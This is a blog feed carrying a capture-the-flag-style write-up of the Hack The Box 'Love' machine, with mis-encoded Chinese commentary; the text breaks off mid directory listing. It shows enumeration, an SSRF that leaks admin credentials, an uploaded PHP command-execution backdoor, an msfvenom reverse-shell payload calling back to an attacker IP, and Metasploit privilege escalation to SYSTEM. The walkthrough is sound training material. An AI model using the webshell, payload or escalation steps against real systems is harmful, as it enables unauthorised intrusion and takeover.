<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lluna&#39;s Pure land.</title>
  
  <subtitle>What is life like when singing to wine?</subtitle>
  <link href="https://lunamoore.github.io/atom.xml" rel="self"/>
  
  <link href="https://lunamoore.github.io/"/>
  <updated>2021-08-05T09:22:50.950Z</updated>
  <id>https://lunamoore.github.io/</id>
  
  <author>
    <name>Lluna</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HTB-love</title>
    <link href="https://lunamoore.github.io/2021/08/05/HTB-love/"/>
    <id>https://lunamoore.github.io/2021/08/05/HTB-love/</id>
    <published>2021-08-05T09:13:34.000Z</published>
    <updated>2021-08-05T09:22:50.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/08/05/HTB-love/image-20210805133747044.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><blockquote><p>ä¿¡æ¯å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°httpç«¯å£æœ‰80ã€5000ï¼Œåœ¨443ç«¯å£ä¸‹å¯ä»¥çœ‹åˆ°staging.love.htbï¼Œæ·»åŠ ä¸€æ¡hosts</p><p>10.10.10.239    staging.love.htb</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/love]</span><br><span class="line">â””â”€# nmap -sC -sV -sT 10.10.10.239 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 01:31 EDT</span><br><span class="line">Nmap scan report for staging.love.htb (10.10.10.239)</span><br><span class="line">Host is up (0.40s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-title: Secure file scanner</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in</span><br><span class="line">| Not valid before: 2021-01-18T14:00:16</span><br><span class="line">|_Not valid after:  2022-01-18T14:00:16</span><br><span class="line">445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GetRequest, Help, LDAPSearchReq, NULL:</span><br><span class="line">|_    Host &#x27;10.10.17.216&#x27; is not allowed to connect to this MariaDB server</span><br><span class="line">5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=8/5%Time=610B77EA%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,4B,&quot;G\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allow</span><br><span class="line">SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(GetRequest,4</span><br><span class="line">SF:B,&quot;G\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allowed\</span><br><span class="line">SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(Help,4B,&quot;G\0\0\</span><br><span class="line">SF:x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allowed\x20to\x20</span><br><span class="line">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(LDAPSearchReq,4B,&quot;G\0\0\</span><br><span class="line">SF:x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allowed\x20to\x20</span><br><span class="line">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;);</span><br><span class="line">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h45m34s, deviation: 4h02m32s, median: 25m32s</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_10::-</span><br><span class="line">|   Computer name: Love</span><br><span class="line">|   NetBIOS computer name: LOVE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2021-08-04T22:58:30-07:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2021-08-05T05:58:29</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 143.66 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>å°±ä¸€ä¸ªç™»å…¥æ¡†</code></p><img src="/2021/08/05/HTB-love/image-20210805134721475.png" class><h2 id="0x03-è®¿é—®5000ç«¯å£"><a href="#0x03-è®¿é—®5000ç«¯å£" class="headerlink" title="0x03.è®¿é—®5000ç«¯å£"></a>0x03.è®¿é—®5000ç«¯å£</h2><p><code>å‘ç°æ²¡æœ‰æƒé™</code></p><img src="/2021/08/05/HTB-love/image-20210805134818437.png" class><h2 id="0x04-åˆ—ä¸€ä¸‹ç›®å½•"><a href="#0x04-åˆ—ä¸€ä¸‹ç›®å½•" class="headerlink" title="0x04.åˆ—ä¸€ä¸‹ç›®å½•"></a>0x04.åˆ—ä¸€ä¸‹ç›®å½•</h2><p><code>å¯ä»¥å‘ç°admin dist images includes pluginsï¼Œè®¿é—®è¿™äº›ç›®å½•å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆæ•æ„Ÿä¿¡æ¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/love]</span><br><span class="line">â””â”€# gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirb/common.txt -t 50</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.239</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/05 01:49:07 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 302]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 302]</span><br><span class="line">/.hta                 (Status: 403) [Size: 302]</span><br><span class="line">/ADMIN                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/ADMIN/]</span><br><span class="line">/Admin                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/Admin/]</span><br><span class="line">/admin                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/admin/]</span><br><span class="line">/aux                  (Status: 403) [Size: 302]</span><br><span class="line">/cgi-bin/             (Status: 403) [Size: 302]</span><br><span class="line">/com2                 (Status: 403) [Size: 302]</span><br><span class="line">/com3                 (Status: 403) [Size: 302]</span><br><span class="line">/com1                 (Status: 403) [Size: 302]</span><br><span class="line">/con                  (Status: 403) [Size: 302]</span><br><span class="line">/dist                 (Status: 301) [Size: 336] [--&gt; http://10.10.10.239/dist/]</span><br><span class="line">/examples             (Status: 503) [Size: 402]</span><br><span class="line">/images               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/images/]</span><br><span class="line">/Images               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/Images/]</span><br><span class="line">/includes             (Status: 301) [Size: 340] [--&gt; http://10.10.10.239/includes/]</span><br><span class="line">/index.php            (Status: 200) [Size: 4388]</span><br><span class="line">/licenses             (Status: 403) [Size: 421]</span><br><span class="line">/lpt1                 (Status: 403) [Size: 302]</span><br><span class="line">/lpt2                 (Status: 403) [Size: 302]</span><br><span class="line">/nul                  (Status: 403) [Size: 302]</span><br><span class="line">/phpmyadmin           (Status: 403) [Size: 302]</span><br><span class="line">/plugins              (Status: 301) [Size: 339] [--&gt; http://10.10.10.239/plugins/]</span><br><span class="line">/prn                  (Status: 403) [Size: 302]</span><br><span class="line">/server-status        (Status: 403) [Size: 421]</span><br><span class="line">/server-info          (Status: 403) [Size: 421]</span><br><span class="line">/webalizer            (Status: 403) [Size: 302]</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">2021/08/05 01:49:46 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-è®¿é—®adminç›®å½•"><a href="#0x05-è®¿é—®adminç›®å½•" class="headerlink" title="0x05.è®¿é—®adminç›®å½•"></a>0x05.è®¿é—®adminç›®å½•</h2><p><code>è¿™é‡Œçš„adminç›®å½•ä¸é»˜è®¤ç™»å…¥æ¡†è¿˜æœ‰äº›ä¸åŒ</code></p><img src="/2021/08/05/HTB-love/image-20210805135557560.png" class><h2 id="0x06-è®¿é—®åŸŸåstaging-love-htb"><a href="#0x06-è®¿é—®åŸŸåstaging-love-htb" class="headerlink" title="0x06.è®¿é—®åŸŸåstaging.love.htb"></a>0x06.è®¿é—®åŸŸåstaging.love.htb</h2><p><code>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªç½‘é¡µçˆ¬è™«å·¥å…·ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªdemoç¤ºä¾‹</code></p><img src="/2021/08/05/HTB-love/image-20210805135725119.png" class><img src="/2021/08/05/HTB-love/image-20210805135836932.png" class><p><code>æµ‹è¯•80ä¸5000ç«¯å£</code></p><img src="/2021/08/05/HTB-love/image-20210805140036148.png" class><p><code>åœ¨5000ç«¯å£å¾—åˆ°adminå£ä»¤</code></p><img src="/2021/08/05/HTB-love/image-20210805140147979.png" class><h2 id="0x07-adminç™»å…¥"><a href="#0x07-adminç™»å…¥" class="headerlink" title="0x07.adminç™»å…¥"></a>0x07.adminç™»å…¥</h2><blockquote><p>user:admin</p><p>pass:@LoveIsInTheAir!!!!</p></blockquote><img src="/2021/08/05/HTB-love/image-20210805140538037.png" class><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°å¯ä»¥åœ¨photoå¤„ä¸Šä¼ æ–‡ä»¶ï¼Œä¹‹åæµ‹è¯•ï¼Œå‘ç°æ–‡ä»¶ç±»å‹ä¸é™åˆ¶</code></p><img src="/2021/08/05/HTB-love/image-20210805141121416.png" class><p><code>ä¸Šä¼ kaliè‡ªå¸¦åå¼¹shellä½†æ˜¯å¤±è´¥äº†</code></p><img src="/2021/08/05/HTB-love/image-20210805141504716.png" class><h2 id="0x08-ä½¿ç”¨Godzilla"><a href="#0x08-ä½¿ç”¨Godzilla" class="headerlink" title="0x08.ä½¿ç”¨Godzilla"></a>0x08.ä½¿ç”¨Godzilla</h2><pre><code>### 1.é¦–å…ˆç”Ÿæˆshell</code></pre><img src="/2021/08/05/HTB-love/image-20210805141842273.png" class><img src="/2021/08/05/HTB-love/image-20210805141913586.png" class><img src="/2021/08/05/HTB-love/image-20210805141952344.png" class><h3 id="2-ä¸Šä¼ "><a href="#2-ä¸Šä¼ " class="headerlink" title="2.ä¸Šä¼ "></a>2.ä¸Šä¼ </h3><img src="/2021/08/05/HTB-love/image-20210805142101197.png" class><img src="/2021/08/05/HTB-love/image-20210805142138490.png" class><h3 id="3-è®¿é—®get-shell"><a href="#3-è®¿é—®get-shell" class="headerlink" title="3.è®¿é—®get shell"></a>3.è®¿é—®get shell</h3><p><code>Godzillaæ·»åŠ ç›®æ ‡</code></p><img src="/2021/08/05/HTB-love/image-20210805142304611.png" class><img src="/2021/08/05/HTB-love/image-20210805142745654.png" class><p><code>è¿™é‡Œä½¿ç”¨Godzillaåå¼¹meterpreter shellå¤±è´¥äº†</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:5555 </span><br><span class="line">[*] Sending stage (39282 bytes) to 10.10.10.239</span><br><span class="line">[*]  - Meterpreter session 1 closed.  Reason: Died</span><br><span class="line">[-] Meterpreter session 1 is not valid and will be closed</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x09-ä½¿ç”¨Behinder"><a href="#0x09-ä½¿ç”¨Behinder" class="headerlink" title="0x09.ä½¿ç”¨Behinder"></a>0x09.ä½¿ç”¨Behinder</h2><p><code>Godzillaåå¼¹shellå¤±è´¥äº†ï¼Œè¿™é‡Œä½¿ç”¨BehinderæˆåŠŸäº†ï¼Œä½†æ˜¯ä¹Ÿä¸èƒ½ææƒã€‚ã€‚ã€‚ã€‚</code></p><img src="/2021/08/05/HTB-love/image-20210805154044687.png" class><h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><p><code>ä½¿ç”¨msfvenomææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[/usr/share/webshells/php]</span><br><span class="line">â””â”€# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.216 LPORT=6666 -f exe &gt; /root/htb/love/sb.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">                                       </span><br></pre></td></tr></table></figure><p><code>å…ˆä¸Šä¼ ä¸€ä¸ªå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å°é©¬ï¼Œå†ä¸Šä¼ sb.exeåå¼¹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_REQUEST[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span></span><br><span class="line">        echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        $cmd = ($_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">        system($cmd);</span><br><span class="line">        echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">        die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2021/08/05/HTB-love/image-20210805155845897.png" class><img src="/2021/08/05/HTB-love/image-20210805155927060.png" class><p><code>å¼€å¯msfç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ‰§è¡Œsb.exe</code></p><img src="/2021/08/05/HTB-love/image-20210805160641546.png" class><p><code>å¾—åˆ°shellï¼Œä½†æ˜¯ä¸èƒ½ææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.239</span><br><span class="line">[*] Meterpreter session 10 opened (10.10.17.216:6666 -&gt; 10.10.10.239:52612) at 2021-08-05 04:07:09 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: LOVE\Phoebe</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (RPCSS variant)</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨always_install_elevatedææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 10...</span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information         Connection</span><br><span class="line">  --  ----  ----                     -----------         ----------</span><br><span class="line">  10        meterpreter x86/windows  LOVE\Phoebe @ LOVE  10.10.17.216:6666 -&gt; 10.10.10.239:52612 (10.10.10.239)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/always_install_elevated </span><br><span class="line">[*] Using configured payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; set session 10</span><br><span class="line">session =&gt; 10</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/always_install_elevated):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  10               yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line">[*] Uploading the MSI to C:\Users\Phoebe\AppData\Local\Temp\pqfzrkZhtqhj.msi ...</span><br><span class="line">[*] Executing MSI...</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.239</span><br><span class="line">[+] Deleted C:\Users\Phoebe\AppData\Local\Temp\pqfzrkZhtqhj.msi</span><br><span class="line">[*] Meterpreter session 11 opened (10.10.17.216:6666 -&gt; 10.10.10.239:52625) at 2021-08-05 04:10:28 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\WINDOWS\system32</span><br><span class="line">meterpreter &gt; cd /</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2015-07-10 07:04:22 -0400  $Recycle.Bin</span><br><span class="line">40777/rwxrwxrwx   0       dir   2021-04-12 16:17:58 -0400  $WinREAgent</span><br><span class="line">40777/rwxrwxrwx   4096    